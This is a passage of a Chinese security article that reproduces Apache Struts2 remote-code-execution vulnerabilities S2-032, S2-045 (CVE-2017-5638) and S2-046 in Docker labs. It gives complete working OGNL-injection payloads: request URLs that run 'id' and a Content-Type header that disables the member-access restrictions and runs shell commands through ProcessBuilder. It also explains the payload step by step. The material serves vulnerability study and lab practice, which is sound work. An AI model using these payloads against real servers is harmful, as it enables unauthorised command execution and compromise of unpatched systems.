YaHei&quot;, Arial, sans-serif;border-radius: 4px;display: block;" title="null"  /></figure><h1 style="margin: 2em auto 1em;-webkit-tap-highlight-color: transparent;white-space: normal;text-align: center;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 1.2em;font-weight: bold;display: table;padding-right: 1em;padding-left: 1em;border-bottom: 2px solid rgb(15, 76, 129);">S2-032</h1><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">当启用动态方法调用时，可以传递可用于在服务器端执行任意代码的恶意表达式。method:<name style="-webkit-tap-highlight-color: transparent;">&nbsp;Action 前缀去调用声明为 public 的函数，只不过在低版本中 Strtus2 不会对 name 方法值做 OGNL 计算，而在高版本中会。.</name></p><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">进入s2-032的docker环境</p><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.54005400540054" src="图片/HACK学习呀_2021-08-24_干货｜最全的Struts2漏洞复现/31_PUWjDibJnsO2oQYSwx0bsBrTCelqHQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibBy0lhdbKX8MItu6icWjf5wfWCqaCoZR0zYku8z7cNicsXluaPUWjDibJnsO2oQYSwx0bsBrTCelqHQ/640?wx_fmt=png'" data-type="png" data-w="1111" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;border-radius: 4px;display: block;" title="null"  /></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">构造payload返回1001060253718则代表可代码执行</p><section class="code-snippet__github" style="margin: 10px 8px;-webkit-tap-highlight-color: transparent;display: flex;font-size:12px;line-height:32px;;height: auto;background-color: rgb(247, 247, 247);border-radius: 8px;color: rgb(0, 0, 0);font family: &quot;PingFang SC&quot;;text-align: start;white-space: normal;"><pre data-lang="" style="-webkit-tap-highlight-color: transparent;display: grid;counter-reset: line 0;overflow-x: auto;padding: 1em;-webkit-box-flex: 1;flex: 1 1 0%;line-height: 20px;font family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;"><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">http</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">:</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(150, 152, 150);">//192.168.1.8:8080/memoindex.action?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23context[%23parameters.obj[0]].getWriter().print(%23parameters.content[0]%2b602%2b53718),1?%23xx:%23request.toString&amp;obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;content=10010</span></span></code></pre></section><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.4467680608365019" src="图片/HACK学习呀_2021-08-24_干货｜最全的Struts2漏洞复现/32_8u4FpSzWrHmCyau3IuYOvyDtLBRTVA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibBy0lhdbKX8MItu6icWjf5wibM1KUYo9TcHMW1pRWU4ulicR98u4FpSzWrHmCyau3IuYOvyDtLBRTVA/640?wx_fmt=png'" data-type="png" data-w="526" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;border-radius: 4px;display: block;" title="null"  /></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">构造payload输出id</p><section class="code-snippet__github" style="margin: 10px 8px;-webkit-tap-highlight-color: transparent;display: flex;font-size:12px;line-height:32px;;height: auto;background-color: rgb(247, 247, 247);border-radius: 8px;color: rgb(0, 0, 0);font family: &quot;PingFang SC&quot;;text-align: start;white-space: normal;"><pre data-lang="" style="-webkit-tap-highlight-color: transparent;display: grid;counter-reset: line 0;overflow-x: auto;padding: 1em;-webkit-box-flex: 1;flex: 1 1 0%;line-height: 20px;font family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;"><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">http</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">:</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(150, 152, 150);">//192.168.1.8:8080/index.action?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd%5B0%5D).getInputStream()).useDelimiter(%23parameters.pp%5B0%5D),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp%5B0%5D,%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&amp;pp=%5C%5CA&amp;ppp=%20&amp;encoding=UTF-8&amp;cmd=id</span></span></code></pre></section><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.3134920634920635" src="图片/HACK学习呀_2021-08-24_干货｜最全的Struts2漏洞复现/33_oHcAhfQ4e9Kgc5yD6WTl5la4X0e9nQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibBy0lhdbKX8MItu6icWjf5w4wwoqVKcXdC0BlmEaAJJNcbmoHcAhfQ4e9Kgc5yD6WTl5la4X0e9nQ/640?wx_fmt=png'" data-type="png" data-w="504" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;border-radius: 4px;display: block;" title="null"  /></figure><h1 style="margin: 2em auto 1em;-webkit-tap-highlight-color: transparent;white-space: normal;text-align: center;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 1.2em;font-weight: bold;display: table;padding-right: 1em;padding-left: 1em;border-bottom: 2px solid rgb(15, 76, 129);">S2-045</h1><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">Apache Struts 2被曝存在远程命令执行漏洞，漏洞编号S2-045，CVE编号CVE-2017-5638，在使用基于Jakarta插件的文件上传功能时，有可能存在远程命令执行，导致系统被黑客入侵。恶意用户可在上传文件时通过修改HTTP请求头中的Content-Type值来触发该漏洞，进而执行系统命令。</p><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">影响范围</p><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">Struts 2.3.5 – Struts 2.3.31 Struts 2.5 – Struts 2.5.10</p><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">进入s2-045的docker环境</p><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.4646017699115044" src="图片/HACK学习呀_2021-08-24_干货｜最全的Struts2漏洞复现/34_4uolVyDngBkkUOH3u2u9nj7bqcUROA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibBy0lhdbKX8MItu6icWjf5wicBmSQmNvejmn6ntWXmI8dtH74uolVyDngBkkUOH3u2u9nj7bqcUROA/640?wx_fmt=png'" data-type="png" data-w="1130" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;border-radius: 4px;display: block;" title="null"  /></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">构造payload任意命令执行</p><section class="code-snippet__github" style="margin: 10px 8px;-webkit-tap-highlight-color: transparent;display: flex;font-size:12px;line-height:32px;;height: auto;background-color: rgb(247, 247, 247);border-radius: 8px;color: rgb(0, 0, 0);font family: &quot;PingFang SC&quot;;text-align: start;white-space: normal;"><pre data-lang="" style="-webkit-tap-highlight-color: transparent;display: grid;counter-reset: line 0;overflow-x: auto;padding: 1em;-webkit-box-flex: 1;flex: 1 1 0%;line-height: 20px;font family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;"><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Content</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Type</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">:</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">"%{(#xxx='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='"</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">pwd</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">"').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"</span></span></code></pre></section><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">对于payload的一些解释</p><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">来获取上下文容器</p><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li></ul><pre class="code-snippet__js" data-lang="shell"><code><span class="code-snippet_outer"><span class="code-snippet__meta">#</span>container=<span class="code-snippet__comment">#context['com.opensymphony.xwork2.ActionContext.container']&nbsp;</span></span></code></pre></section><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">通过容器实例化，对Ognl API的通用访问，设置和获取属性&nbsp;</p><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li></ul><pre class="code-snippet__js" data-lang="kotlin"><code><span class="code-snippet_outer">#ognlUtil=#container.getInstance(<span class="code-snippet__meta">@com</span>.opensymphony.xwork2.ognl.<span class="code-snippet__symbol">OgnlUtil@</span><span class="code-snippet__class"><span class="code-snippet__keyword">class</span> </span></span></code></pre></section><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">判断目标主机的操作系统类型，并进行执行命令赋值&nbsp;<br  /></p><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li></ul><pre class="code-snippet__js" data-lang="typescript"><code><span class="code-snippet_outer">#iswin=(<span class="code-snippet__meta">@java</span>.lang.System<span class="code-snippet__meta">@getProperty</span>(<span class="code-snippet__string">'os.name'</span>).toLowerCase().contains(<span class="code-snippet__string">'win'</span>))).(#cmds=(#iswin?{<span class="code-snippet__string">'cmd.exe'</span>,<span class="code-snippet__string">'/c'</span>,#cmd}:{<span class="code-snippet__string">'/bin/bash'</span>,<span class="code-snippet__string">'-c'</span>,#cmd&nbsp;})&nbsp;</span></code></pre></section><p><span style="font family: mp-quote, -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;">&nbsp;</span><span style="white-space: pre-wrap;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size:14px;line-height:34px;;text-align: left;background-color: rgba(0, 0, 0, 0.03);">执行攻击命令</span></p><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li></ul><pre class="code-snippet__js" data-lang="typescript"><code><span class="code-snippet_outer">#p=<span class="code-snippet__keyword">new</span> java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(<span class="code-snippet__literal">true</span>)).(#process=#p.start()).(#ros=(<span class="code-snippet__meta">@org</span>.apache.struts2.ServletActionContext<span class="code-snippet__meta">@getResponse</span>().getOutputStream())).(<span class="code-snippet__meta">@org</span>.apache.commons.io.IOUtils<span class="code-snippet__meta">@copy</span>(#process.getInputStream(),#ros)).(#ros.flush())</span></code></pre></section><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.8048780487804879" src="图片/HACK学习呀_2021-08-24_干货｜最全的Struts2漏洞复现/35_8qITa2b8M5lNkpMcWgzicCruiaMg1g.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibBy0lhdbKX8MItu6icWjf5wqhicbb6RN1ZUn43bZvZibzZ6aoum8qITa2b8M5lNkpMcWgzicCruiaMg1g/640?wx_fmt=png'" data-type="png" data-w="984" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;border-radius: 4px;display: block;" title="null"  /></figure><h1 style="margin: 2em auto 1em;-webkit-tap-highlight-color: transparent;white-space: normal;text-align: center;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 1.2em;font-weight: bold;display: table;padding-right: 1em;padding-left: 1em;border-bottom: 2px solid rgb(15, 76, 129);">S2-046</h1><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">s2-046漏洞的利用有点特殊，需要满足以下几个条件：</p><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">1、系统必须使用 Jakarta 插件，检查 Struts2 配置文件中是否有以下配置：&lt;constant name =“struts.multipart.parser”value =“jakarta-stream”/&gt;</p><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">2、上传文件的大小（由 Content-LSength 头指定）大于 Struts2 允许的最大大小（2GB）</p><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">3、文件名内容构造恶意的 OGNL 内容。</p><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">如果满足以上要求，Struts2 受影响版本将创建一个包含攻击者控制的异常文件名，使用 OGNL 值堆栈来定位错误消息，OGNL 值堆栈将插入任何 OGNL 变量（$ {}或％{}）作为 OGNL 表达式，然后实现任意代码执行。</p><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">与045相同，046也是OGNL注入，但出现在上传请求的文件名字段中，并且需要NUL字节来拆分有效负载和其余字符串。</p><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">进入s2-046的docker环境</p><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.22942206654991243" src="图片/HACK学习呀_2021-08-24_干货｜最全的Struts2漏洞复现/36_cgQwAGib1libyF7CvwThKlTjC2icpQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibBy0lhdbKX8MItu6icWjf5w27mTW3DlecavLHRr32ibibqibD72R0icgQwAGib1libyF7CvwThKlTjC2icpQ/640?wx_fmt=png'" data-type="png" data-w="1142" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;border-radius: 4px;display: block;" title="null"  /></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">点击submit进行抓包，可以看到这里的filename正常情况下是为空的</p><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.7188796680497925" src="图片/HACK学习呀_2021-08-24_干货｜最全的Struts2漏洞复现/37_TxHmkricfOKsETx6aVJc0RRIogNDkA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibBy0lhdbKX8MItu6icWjf5wxXhBX2vj2KFicHx8QYjQv4WXjRTxHmkricfOKsETx6aVJc0RRIogNDkA/640?wx_fmt=png'" data-type="png" data-w="964" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;border-radius: 4px;display: block;" title="null"  /></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">构造payload执行1+99</p><section class="code-snippet__github" style="margin: 10px 8px;-webkit-tap-highlight-color: transparent;display: flex;font-size:12px;line-height:32px;;height: 